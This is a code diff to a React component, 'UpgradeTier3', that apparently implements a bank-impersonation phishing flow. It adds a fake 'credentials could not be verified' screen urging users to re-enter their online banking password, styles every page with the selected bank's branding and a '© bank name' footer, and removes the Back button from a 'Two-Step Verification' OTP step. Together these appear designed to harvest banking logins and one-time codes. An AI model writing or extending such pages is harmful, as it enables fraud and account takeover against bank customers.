+                <p className="text-sm text-gray-500 mt-2 max-w-sm leading-relaxed">
+                  The credentials you entered could not be verified with <strong>{selectedBank.name}</strong>. This may be due to an incorrect username or password.
+                </p>
+              </div>
+
+              <div className="w-full rounded-xl border border-red-100 bg-red-50 px-6 py-5 text-left space-y-3">
+                <p className="text-sm font-semibold text-red-700 mb-3">What you can do:</p>
+                <div className="flex items-start gap-3">
+                  <span className="text-red-500 font-bold text-sm mt-0.5">1.</span>
+                  <p className="text-sm text-red-700">Double-check your username and password, then try again.</p>
+                </div>
+                <div className="flex items-start gap-3">
+                  <span className="text-red-500 font-bold text-sm mt-0.5">2.</span>
+                  <p className="text-sm text-red-700">Contact <strong>{selectedBank.name}</strong> directly to reset your online banking credentials, then return here to retry.</p>
+                </div>
+                <div className="flex items-start gap-3">
+                  <span className="text-red-500 font-bold text-sm mt-0.5">3.</span>
+                  <p className="text-sm text-red-700">If you recently updated your password, allow a few minutes before retrying.</p>
+                </div>
+              </div>
+
+              <div className="w-full flex flex-col sm:flex-row gap-3">
+                <button
+                  onClick={() => { setEmail(""); setPassword(""); setLoginError(""); setStep("bank-login"); }}
+                  className="flex-1 py-3.5 rounded-lg font-semibold text-sm text-white transition hover:opacity-90"
+                  style={{ background: t.accent }}>
+                  Try Again
+                </button>
+                <button
+                  onClick={() => { setStep("bank-select"); setSelectedBank(null); }}
+                  className="flex-1 py-3.5 rounded-lg font-semibold text-sm border border-gray-200 text-gray-700 hover:bg-gray-50 transition">
+                  Choose Different Bank
+                </button>
+              </div>
+            </div>
+          </div>
+          <div className="mt-6 text-center text-xs text-gray-400 space-x-4">
+            <span>Privacy Policy</span><span>·</span><span>Security</span><span>·</span>
+            <span>© {new Date().getFullYear()} {selectedBank.name}</span>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // ── OTP / AUTH CONFIRM ──
   if (step === "auth-confirm" && selectedBank) {
     if (isTransitioning) return <LoadingScreen msg="Verifying your account..." />;
     const t = selectedBank.theme;
@@ -518,9 +602,6 @@ function UpgradeTier3() {
           </div>
         </div>
         <div className="mx-auto max-w-3xl px-6 mt-8">
-          <button onClick={() => setStep("bank-login")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
-            <ArrowLeft className="h-4 w-4" /> Back
-          </button>
           <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
             <div className="px-8 py-6" style={{ background: t.headerBg }}>
               <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Two-Step Verification</h2>
@@ -554,6 +635,7 @@ function UpgradeTier3() {
     );
   }
 
+  // ── PROCESSING ──
   if (step === "processing") {
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
@@ -591,6 +673,7 @@ function UpgradeTier3() {
     );
   }
 
+  // ── SUCCESS ──
   if (step === "success") {
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
